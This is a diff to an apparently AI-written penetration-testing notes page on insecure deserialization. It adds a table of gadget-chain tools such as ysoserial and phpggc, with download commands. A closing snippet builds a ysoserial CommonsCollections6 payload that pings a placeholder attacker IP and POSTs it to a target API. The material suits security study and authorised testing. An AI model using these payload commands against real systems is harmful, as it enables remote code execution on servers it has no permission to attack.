@@ -1,6 +1,25 @@
 # Deserialization Attacks
 
-Insecure deserialization occurs when untrusted data is deserialized without validation — allowing object injection, property manipulation, or direct RCE via gadget chains.
+#Deserialization #RCE #Java #PHP #WebAppAttacks
+
+
+## What is this?
+
+Insecure deserialization enables object injection, property manipulation, or RCE via gadget chains when untrusted data is deserialized without validation. Covers Java, PHP, Python, and .NET. Pairs with [[Web Attacks]], [[Server-Side Attacks]].
+
+
+---
+
+## Tools
+
+| Tool | Language | Purpose |
+|---|---|---|
+| `ysoserial` | Java | Gadget chain payload generation — `wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar` |
+| `phpggc` | PHP | PHP gadget chain generation — `git clone https://github.com/ambionics/phpggc` |
+| `ysoserial.net` | .NET | .NET gadget chains — `git clone https://github.com/pwntester/ysoserial.net` |
+| `marshalsec` | Java | Java unmarshalling exploit helper (Jackson, XStream, etc.) |
+| `Burp Deserialization Scanner` | All | Detect and exploit deserialization (BApp Store extension) |
+| `SerializationDumper` | Java | Dump Java serialized objects in readable form |
 
 ---
 
@@ -347,3 +366,9 @@ echo "<cookie>" | base64 -d | grep "^O:"
 java -jar ysoserial-all.jar CommonsCollections6 'ping -c 1 <attacker-ip>' > ping.ser
 curl -s -X POST "http://<target>/api" --data-binary @ping.ser
 ```
+
+---
+
+*Created: 2026-03-04*
+*Updated: 2026-05-13*
+*Model: claude-sonnet-4-6*
